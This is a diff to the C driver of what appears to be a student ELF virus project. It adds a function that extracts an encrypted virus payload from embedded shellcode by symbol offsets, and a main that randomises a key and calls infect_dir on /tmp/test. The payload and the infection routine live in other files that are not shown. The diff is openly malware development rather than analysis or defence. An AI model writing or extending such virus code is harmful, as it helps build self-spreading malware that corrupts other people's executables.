@@ -23,32 +23,42 @@ extern char OLD_KEY[16]; //defined in infect.c
 extern unsigned char virus_shellcode[];
 extern unsigned int virus_shellcode_len;
 
-/*int woody_woodpacker(char *bin_to_pack, char *k, int force){
-	randomize(OLD_KEY);
-	int i = 0;
 
-	for (i = 0; i < 16 && k && k[i]; i++)
-		KEY[i] = k[i];
-	for (; i < 16; i++)
-		KEY[i] = OLD_KEY[i];
+int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
+	println("VIRUS INFO");
+	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
+	//Elf64_Ehdr *h = (void*)virus_shellcode;
+	long long bin_start_off;
+	long long bin_end_off;
 
-	create_woody(bin_to_pack, virus_shellcode, virus_shellcode_len, force);
-	return 0;
-}*/
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_start", &bin_start_off);
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
+	(*v) = virus_shellcode + bin_start_off;
+	(*l) = bin_end_off - bin_start_off; 
+	printnbln(bin_start_off);
+	printnbln(bin_end_off);
+
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", c_off);
+	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", c_len);
+	(*c_len) = (*c_len)-(*c_off);
+	(*c_off) -= bin_start_off; 
+	printnbln(*c_off);
+	printnbln(*c_len);
+
+
+	return TRUE;
+}
 
 int main(int ac, char **av){
 	(void)ac;
 	(void)av;
-	infect_dir("/tmp/test", virus_shellcode, virus_shellcode_len);
-	//infect_dir("/tmp/test2", virus_shellcode, virus_shellcode_len);
-	/*
-	if (ac < 2){
-		return usage(av[0]);
-	}
-	if (ac == 3 && str_equal(av[1], "--force"))
-		return woody_woodpacker(av[2], NULL, TRUE);
-	if (ac == 4 && str_equal(av[1], "--key"))
-		return woody_woodpacker(av[3], av[2], FALSE);
-	else
-		return woody_woodpacker(av[1], NULL, FALSE);*/
+
+	char *virus;
+	size_t virus_len;
+	size_t crypt_off;
+	size_t crypt_len;
+	get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len);
+	
+	randomize(KEY);
+	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len);
 }
